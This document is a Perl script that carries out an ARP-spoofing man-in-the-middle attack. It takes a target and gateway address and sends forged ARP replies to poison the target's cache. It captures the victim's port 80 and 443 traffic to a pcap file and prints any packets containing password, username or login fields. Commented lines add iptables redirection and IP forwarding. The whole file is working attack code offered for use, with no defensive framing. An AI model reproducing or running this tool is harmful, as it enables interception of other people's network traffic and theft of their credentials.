#!/usr/bin/perl
use strict;
#sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-ports 10000
#system('sysctl -w net.ipv4.ip_forward=1');
use NetPacket::TCP;        # packet disassembly
use Net::Pcap;             # sniffing
use Net::ARP;              # craft,send ARP to target
use Net::Frame::Device;    # get local MAC
use Net::Frame::Dump::Online;
use Net::Frame::Simple;

#################getting target info#####################
my $usage= "Enter <targetip>, <targetmac>,<gatewayip>";
my $target_ip  = shift or die("$usage");
my $target_mac = shift or die("$usage");
my $gateway_ip = shift or die("$usage");



#####getting local info###############################

my ( $dev, $err, $net, $mask, $filter ) = "" x 5;
$dev = pcap_lookupdev( \$err );
my $dev_info   = Net::Frame::Device->new( dev => $dev );
my $native_mac = $dev_info->mac();
my $native_ip  = $dev_info->ip();
pcap_lookupnet( $dev, \$net, \$mask, \$err );

####################Start capture and segregate traffic####################
# open the device for live listening
my $pcap = pcap_open_live( $dev, 65535, 1, 4000, \$err )
  or die("Unable to open discriptor for live captuirng: $err");
my $filter_str = ("port 80 or port 443 or arp");

#complile the filter -pcap_compile($pcap, \$filter, $filter_str, $optimize, $netmask)
pcap_compile( $pcap, \$filter, $filter_str,1,$mask );
pcap_setfilter( $pcap, $filter );

#Start- loop- pcap_loop($pcap, $count, \&callback, $user_data)
my $dumper = pcap_dump_open( $pcap, 'mitm_out.pcap' )
  ;    #opening a dump file for later investigation
  
print "Sending initial ARP  to poison targets cache","\n";  
send_arp();

print "Now looping over incoming packets","\n";
pcap_loop( $pcap, -1, \&spoofer, 0 );

sub spoofer {
	my ( $user_data, $header, $packet ) = @_;
	my $type = sprintf( "%02x%02x", unpack( "x12 C2", $packet ) );
	
	if ( $type eq '0806' ) {    #we have an ARP
	my $comp_mac=sprintf( "%02x:%02x:%02x:%02x:%02x:%02x", unpack( "C6", $packet ) );
	print $comp_mac,"\n";
		if ( 
			 $comp_mac eq $native_mac  #destination is our mac
		  )
		{            
			my $req_type=sprintf( "%02x%02x", unpack( "x20 C2", $packet ) );
			print $req_type,"\n";
			if ( $req_type eq "0001" ) #reason is in IPv4 spec
			{
				#its an ARP request
				print "Got an ARP request. Sending reply", "\n";
				send_arp();
				return;

			}
		}	
	}	
			else {
				#packet must belong to port 80 or 443 so save it
				pcap_dump( $dumper, $header, $packet );
				my $packet_length = length($packet);
				my $string        = "";
				for ( my $i = 0 ; $i < $packet_length ; $i++ ) {
					$string .=
					  pack( "H*", unpack( 'H2', substr( $packet, $i, 1 ) ) );
				#	print "$string", "\n";

		   $string =~ s/\R/ /g;
		   print "\n",$string,"\n" if($string =~ m/passw(ord)?=/i or $string =~
		   m/user(name)?=/i or $string =~ m/login=/i);

				}
			}


}

sub send_arp {
Net::ARP::send_packet(
$dev,
$gateway_ip,
$target_ip,
$native_mac,
$target_mac,
"reply");
}

END{
pcap_close($pcap) if($pcap);
pcap_dump_close($dumper) if($dumper);
print "Exiting.\n";
}
